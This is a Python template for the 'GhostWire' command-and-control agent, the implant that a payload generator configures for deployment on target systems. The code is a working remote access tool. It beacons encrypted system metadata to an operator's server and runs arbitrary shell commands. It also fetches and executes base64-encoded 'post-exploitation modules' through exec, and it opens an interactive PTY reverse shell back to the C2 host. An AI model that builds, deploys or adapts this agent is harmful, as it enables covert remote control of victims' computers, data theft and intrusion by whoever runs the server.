"""
GhostWire Agent Template - Cross-Platform C2 Agent
==================================================

This is the template file for the GhostWire C2 agent that gets deployed on target systems.
The agent is responsible for:
- Establishing encrypted communication with the C2 server
- Executing tasks received from the server
- Collecting and returning results
- Providing interactive shell capabilities
- Running post-exploitation modules

Agent Lifecycle:
1. Agent starts and generates a unique ID based on system characteristics
2. Agent begins beaconing loop, connecting to C2 server periodically
3. Agent sends encrypted beacon with metadata and any pending results
4. Agent receives and executes tasks from the server
5. Agent returns results on next beacon cycle

Security Features:
- AES-256-GCM authenticated encryption for all communications
- SSL/TLS transport layer encryption
- Unique agent identification based on system characteristics
- Secure task execution and result collection

Platform Support:
- Windows: Uses WMIC for system UUID, supports .pyw for console-less execution
- Linux: Uses D-Bus machine ID or generates UUID
- macOS: Uses IORegistry for platform UUID

Note: This template contains placeholder values (##C2_IP##, ##C2_PORT##, etc.)
that are replaced by the payload generator with actual configuration values.
"""
import socket, threading, time, json, uuid, struct, subprocess, sys, os, ssl, base64, platform

# --- Embedded Configuration (Replaced by Payload Generator) ---
# These placeholders are replaced with actual values during payload generation
C2_IP, C2_PORT, AES_KEY_B64, SLEEP_INTERVAL = "##C2_IP##", ##C2_PORT##, "##AES_KEY_B64##", 5

# --- Crypto Utilities for AES-256-GCM Encryption ---
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class Crypto:
    """
    Cryptographic utilities for agent-server communications.
    
    This class provides AES-256-GCM encryption/decryption methods that match
    the server's crypto implementation for secure communications.
    """
    @staticmethod
    def encrypt(k, d): 
        """Encrypt data using AES-256-GCM with random nonce"""
        n = os.urandom(12)  # Generate 12-byte nonce
        return n + AESGCM(k).encrypt(n, d, None)
    
    @staticmethod
    def decrypt(k, d): 
        """Decrypt data using AES-256-GCM"""
        return AESGCM(k).decrypt(d[:12], d[12:], None)

# --- Agent Class - Main Agent Implementation ---
class C2Agent:
    """
    Main C2 agent class that handles communication and task execution.
    
    This class is responsible for:
    - Establishing and maintaining connection to the C2 server
    - Executing various types of tasks (shell, modules, interactive shell)
    - Collecting and returning results
    - Managing the beaconing lifecycle
    """
    def __init__(self, ip, port, key, sleep):
        """
        Initialize the C2 agent with connection parameters.
        
        Args:
            ip: C2 server IP address
            port: C2 server port number
            key: Base64-encoded AES encryption key
            sleep: Beacon interval in seconds
        """
        self.server_ip, self.server_port, self.key, self.sleep = ip, int(port), base64.b64decode(key), int(sleep)
        self.agent_id, self.running = self._get_agent_id(), True
        self.results_to_send = []  # Queue for results to send to server

    def _get_agent_id(self):
        """
        Generate a unique agent ID based on system characteristics.
        
        This method attempts to create a persistent identifier that survives
        across reboots but varies between different systems.
        
        Returns:
            str: Unique agent identifier
        """
        try:
            # Windows: Use WMIC to get system UUID
            if platform.system() == "Windows": 
                return subprocess.check_output('wmic csproduct get uuid', stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            
            # Linux: Use D-Bus machine ID if available
            if os.path.exists("/var/lib/dbus/machine-id"): 
                return open("/var/lib/dbus/machine-id", "r").read().strip()
            
            # macOS: Use IORegistry for platform UUID
            if platform.system() == "Darwin": 
                return subprocess.check_output(["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"], stderr=subprocess.DEVNULL).decode().split('IOPlatformUUID" = "')[1].split('"')[0]
        except Exception: 
            pass
        
        # Fallback: Generate a random UUID if all else fails
        return str(uuid.uuid4())

    def _get_metadata(self):
        """
        Collect system metadata for the C2 server.
        
        This information helps the operator understand the target system
        and make informed decisions about task execution.
        
        Returns:
            dict: System metadata including hostname, user, platform, etc.
        """
        user = "N/A"
        try:
            user = os.getlogin()
        except Exception:
            # Fallback methods for getting username
            user = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        
        return {
            "id": self.agent_id, 
            "hostname": socket.gethostname(), 
            "user": user, 
            "platform": platform.system(), 
            "pid": os.getpid()
        }

    def send_with_length(self, sock, data): 
        """Send data with 4-byte length prefix for framing"""
        sock.sendall(struct.pack('>I', len(data)) + data)
    
    def recv_with_length(self, sock):
        """
        Receive length-prefixed data from the server.
        
        This method handles the framing protocol used for all encrypted
        communications with the C2 server.
        
        Args:
            sock: SSL socket to receive from
            
        Returns:
            bytes or None: Received data or None if connection closed
        """
        try:
            # Read 4-byte length prefix
            raw_len = sock.recv(4)
            if not raw_len: 
                return None
            
            # Unpack length (big-endian 32-bit integer)
            msg_len = struct.unpack('>I', raw_len)[0]
            
            # Read complete message
            data = b''
            while len(data) < msg_len:
                more = sock.recv(msg_len - len(data))
                if not more: 
                    return None
                data += more
            return data
        except (socket.error, struct.error): 
            return None

    def run_shell_command(self, task):
        """
        Execute a shell command and collect the output.
        
        Args:
            task: Task dictionary containing the command to execute
        """
        command = task.get('command')
        output = ""
        try:
            # Execute command and capture both stdout and stderr
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore')
        except Exception as e:
            output = f"Shell command failed: {e}"
        
        # Queue result for next beacon
        self.results_to_send.append({
            'task_id': task.get('task_id'), 
            'type': 'shell', 
            'output': output
        })

    def run_module(self, task):
        """
        Execute a post-exploitation module received from the server.
        
        This method dynamically loads and executes Python modules that
        are sent as base64-encoded source code from the C2 server.
        
        Args:
            task: Task dictionary containing module code and arguments
        """
        try:
            # Decode the module source code
            module_code = base64.b64decode(task.get('module_code')).decode()
            
            # Create a safe execution environment with limited globals
            module_globals = {
                '__name__': '__main__', 
                'sys': sys, 
                'os': os, 
                'platform': platform, 
                'subprocess': subprocess, 
                'base64': base64, 
                'io': __import__('io')
            }
            
            # Parse the module to find the main class
            import ast
            tree = ast.parse(module_code)
            class_name = next((node.name for node in ast.walk(tree) if isinstance(node, ast.ClassDef)), None)
            
            if not class_name: 
                raise ValueError("No class found in module")
            
            # Execute the module code in the safe environment
            exec(module_code, module_globals)
            
            # Get the main class and execute its run_remote method
            main_class = module_globals[class_name]
            output = main_class.run_remote(task.get('args'))
            
        except Exception as e:
            output = f"Module execution failed: {e}"
        
        # Queue result for next beacon
        self.results_to_send.append({
            'task_id': task.get('task_id'), 
            'type': 'module', 
            'output': output
        })

    def start_interactive_shell(self):
        """
        Start an interactive PTY shell session with the C2 server.
        
        This method creates a full pseudo-terminal that allows the operator
        to interact directly with the target system's shell.
        
        Note: This feature is not supported on Windows due to lack of PTY support.
        """
        if platform.system() == "Windows":
            self.results_to_send.append({
                'task_id': 'N/A', 
                'type': 'shell', 
                'output': 'PTY shell not supported on Windows.'
            })
            return
        
        # Import PTY-specific modules
        import pty, select
        
        # Connect to the C2 server
        shell_sock = self._connect_to_server()
        if not shell_sock: 
            return
        
        try:
            # Send shell initialization message with agent ID
            shell_sock.sendall(f"SHELL_INIT:{self.agent_id}\n".encode())
            
            # Create pseudo-terminal
            master, slave = pty.openpty()
            
            # Determine shell path (bash preferred, sh as fallback)
            shell_path = '/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
            
            # Start shell process
            p = subprocess.Popen([shell_path, '-i'], preexec_fn=os.setsid, stdin=slave, stdout=slave, stderr=slave)
            
            # Main shell loop - handle bidirectional communication
            while p.poll() is None and self.running:
                # Check for data from either the network or the PTY
                r, _, _ = select.select([shell_sock, master], [], [], 0.2)
                
                # Handle data from network (operator input)
                if shell_sock in r:
                    data = shell_sock.recv(1024)
                    if not data: 
                        break
                    os.write(master, data)
                
                # Handle data from PTY (shell output)
                if master in r:
                    data = os.read(master, 1024)
                    if not data: 
                        break
                    shell_sock.sendall(data)
                    
        except Exception: 
            pass
        finally:
            if shell_sock: 
                shell_sock.close()

    def process_task(self, task):
        """
        Process a task received from the C2 server.
        
        This method routes tasks to appropriate handlers based on the task type.
        
        Args:
            task: Task dictionary containing type and parameters
        """
        task_type = task.get('type')
        
        if task_type == 'kill': 
            # Terminate the agent
            self.running = False
        elif task_type == 'shell':
            # Execute shell command
            self.run_shell_command(task)
        elif task_type == 'interactive_shell':
            # Start interactive shell in separate thread
            threading.Thread(target=self.start_interactive_shell, daemon=True).start()
        elif task_type == 'module':
            # Execute post-exploitation module
            self.run_module(task)

    def _connect_to_server(self):
        """
        Establish SSL/TLS connection to the C2 server.
        
        Returns:
            ssl.SSLSocket or None: Connected SSL socket or None if failed
        """
        try:
            # Create SSL context (disable certificate verification for self-signed certs)
            context = ssl.create_default_context()
            context.check_hostname, context.verify_mode = False, ssl.CERT_NONE
            
            # Create TCP connection and wrap with SSL
            sock = socket.create_connection((self.server_ip, self.server_port))
            return context.wrap_socket(sock, server_hostname=self.server_ip)
        except (socket.error, ssl.SSLError): 
            return None

    def run(self):
        """
        Main agent loop - handles beaconing and task processing.
        
        This method implements the core agent lifecycle:
        1. Connect to C2 server
        2. Send beacon with metadata and results
        3. Receive and process tasks
        4. Sleep before next beacon
        5. Repeat until terminated
        """
        while self.running:
            # Connect to the C2 server
            ssock = self._connect_to_server()
            if ssock:
                try:
                    # Prepare beacon data
                    beacon = {
                        'id': self.agent_id, 
                        'metadata': self._get_metadata(), 
                        'results': self.results_to_send
                    }
                    self.results_to_send = []  # Clear results after sending
                    
                    # Send encrypted beacon to server
                    self.send_with_length(ssock, Crypto.encrypt(self.key, json.dumps(beacon).encode()))
                    
                    # Receive and process response from server
                    encrypted_response = self.recv_with_length(ssock)
                    if encrypted_response:
                        response = json.loads(Crypto.decrypt(self.key, encrypted_response).decode())
                        
                        # Process any tasks received from server
                        for task in response.get('tasks', []): 
                            self.process_task(task)
                            
                except Exception: 
                    pass  # Silently handle any communication errors
                finally: 
                    ssock.close()
            
            # Sleep before next beacon (configurable interval)
            time.sleep(self.sleep)

# --- Agent Entry Point ---
if __name__ == "__main__":
    # Start the C2 agent with configuration from payload generator
    C2Agent(C2_IP, C2_PORT, AES_KEY_B64, SLEEP_INTERVAL).run()